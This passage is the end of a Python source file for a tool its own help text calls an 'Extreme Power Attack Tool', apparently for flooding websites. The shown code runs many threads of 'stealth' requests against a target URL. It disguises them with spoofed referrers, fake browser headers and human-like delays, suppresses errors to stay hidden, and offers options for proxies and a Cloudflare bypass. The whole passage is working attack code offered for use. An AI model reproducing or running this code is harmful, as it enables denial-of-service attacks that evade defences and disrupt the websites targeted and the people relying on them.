                if pages_visited == 0:
                    # First page uses initial referrer
                    if initial_referrer:
                        headers['Referer'] = initial_referrer
                else:
                    # Subsequent pages use previous page as referrer
                    prev_url = list(visited_urls)[-2] if len(visited_urls) >= 2 else base_url
                    headers['Referer'] = prev_url
                
                # Add realistic browser headers
                headers['Sec-CH-UA-Platform'] = f'"{fingerprint["platform"]}"'
                headers['Sec-CH-UA-Mobile'] = '?0' if fingerprint['platform'] not in ['iOS', 'Android'] else '?1'
                
                # Simulate real browser behavior with proper headers
                if random.random() > 0.5:
                    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
                else:
                    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
                
                # Make the request with human-like timing
                # First, simulate "thinking time" before clicking
                thinking_time = random.uniform(1.0, 5.0)
                time.sleep(thinking_time)
                
                # Then make the request
                response = session.get(
                    url,
                    headers=headers,
                    timeout=10,
                    allow_redirects=True
                )
                
                # Process response like a real browser would
                if response.status_code == 200:
                    # Simulate reading time proportional to content length
                    content_length = len(response.text)
                    reading_time = min(random.uniform(2.0, 8.0), session_duration / pages_per_session)
                    
                    # Extract links for potential next clicks (if HTML response)
                    if 'text/html' in response.headers.get('Content-Type', ''):
                        # Here we would parse HTML to find links, but we'll use common_paths instead
                        pass
                    
                    # Simulate user reading the page
                    time.sleep(reading_time)
                    
                    # Track request for stats
                    with self.lock:
                        self.requests_sent += 1
                        self.successful_requests += 1
                    
                    # Log activity occasionally
                    if random.random() > 0.7:
                        print(f"{Fore.GREEN}[Stealth {thread_id}] Browsed {url} - {response.status_code} ({content_length} bytes){Style.RESET_ALL}")
                else:
                    # Handle non-200 responses
                    with self.lock:
                        self.requests_sent += 1
                        self.failed_requests += 1
                    
                    # Log error
                    print(f"{Fore.YELLOW}[Stealth {thread_id}] Error browsing {url} - {response.status_code}{Style.RESET_ALL}")
                
                # Increment pages visited
                pages_visited += 1
                
            except Exception as e:
                with self.lock:
                    self.requests_sent += 1
                    self.failed_requests += 1
                
                # Log error but keep it quiet to maintain stealth
                if random.random() > 0.9:  # Only log 10% of errors to reduce noise
                    print(f"{Fore.RED}[Stealth {thread_id}] Error: {str(e)[:50]}...{Style.RESET_ALL}")
                
                # Add delay after error
                time.sleep(random.uniform(2.0, 5.0))
        
        # Session complete
        session_duration = time.time() - session_start
        print(f"{Fore.BLUE}[Stealth {thread_id}] Session complete: {pages_visited} pages in {session_duration:.1f}s{Style.RESET_ALL}")
        
        # Start a new session after a break (like a new visitor)
        if not self.stop_attack:
            # Wait between sessions
            between_session_delay = random.uniform(5.0, 15.0)
            time.sleep(between_session_delay)
            
            # Recursively start a new session
            self.stealth_attack_method(thread_id)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UltimateManu - Extreme Power Attack Tool")
    parser.add_argument("-u", "--url", help="Target URL (including http:// or https://)")
    parser.add_argument("-t", "--threads", type=int, help="Number of threads to use")
    parser.add_argument("-p", "--proxy", action="store_true", help="Use proxies from proxies.txt")
    parser.add_argument("-c", "--cloudflare", action="store_true", help="Enable CloudFlare bypass")
    
    args = parser.parse_args()
    
    # Initialize attack tool
    attacker = UltimateManu()
    
    # Set command line options if provided
    if args.url:
        attacker.target = args.url
    if args.threads:
        attacker.threads = args.threads
    if args.proxy:
        attacker.use_proxy = True
    if args.cloudflare:
        attacker.cloudflare_bypass = True
        
    # Start the attack
    attacker.run()

